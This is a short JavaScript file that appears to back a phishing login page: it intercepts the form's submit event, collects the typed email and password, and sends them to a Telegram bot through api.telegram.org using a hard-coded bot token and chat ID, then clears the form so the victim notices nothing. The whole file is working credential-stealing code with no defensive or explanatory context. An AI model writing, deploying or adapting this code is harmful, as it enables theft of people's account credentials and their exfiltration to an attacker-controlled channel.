'use strict'

let email = document.querySelector('.username'),
pass = document.querySelector('.password'),
form = document.querySelector('.forma')
    const tokenBot = "7457354769:AAGXld7S67KVepAaS-nm22LKOxyORZVZ62g"
    const chatId = '6733043067'

form.addEventListener('submit', (e)=>{
    e.preventDefault()
    const objecs = {}
    const formdata = new FormData(form)
    formdata.forEach((item, idx)=>{
        objecs[idx] = item
    })
    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage`,{
        method : "POST",
        headers : {"Content-Type" : "application/json"},
        body  : JSON.stringify({
            chat_id : chatId,
            text : `${objecs.email} : ${objecs.pass}`
        })
    })
    e.target.reset()
})